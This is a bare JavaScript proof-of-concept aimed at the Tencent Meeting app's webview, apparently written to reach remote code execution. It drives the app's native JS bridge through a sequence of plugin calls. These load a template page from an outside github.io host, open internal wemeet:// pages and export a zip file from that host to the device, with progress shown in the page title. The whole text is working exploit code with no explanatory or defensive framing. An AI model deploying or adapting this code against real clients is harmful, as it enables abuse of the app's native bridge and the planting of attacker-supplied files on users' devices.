(function(){
  document.title='P126TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P126CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P126TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P126TB-NOMGR:'+location.host;return}
  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
  var tpl='https://gitwhs.github.io/wm-poc-rce/p126tpl.html';
  var zip='https://gitwhs.github.io/wm-poc-rce/p97avatar.zip';
  var sch='wemeet://page/pay/main_process_webview';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['LT','CommonPlugin','LoadTemplateWebView',{
      url:official,
      template_url:tpl,
      template_id:'p126',
      process_pattern:0,
      from_webView:true
    }],
    ['UP','CommonPlugin','UpdateTemplatePreloadDataCache',{
      url:official,
      template_url:tpl,
      template_id:'p126',
      process_pattern:0
    }],
    ['LU','CommonPlugin','LoadUrl',{
      url:official
    }],
    ['OP','CommonPlugin','OpenNewPage',{
      scheme:sch,
      router_params:{url:official}
    }],
    ['EF','CommonPlugin','ExportFile',{
      fileName:'p126.bin',
      contentType:'application/octet-stream',
      url:zip
    }]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P126TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P126-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 3500);
  }
  setTimeout(n, 800);
})();
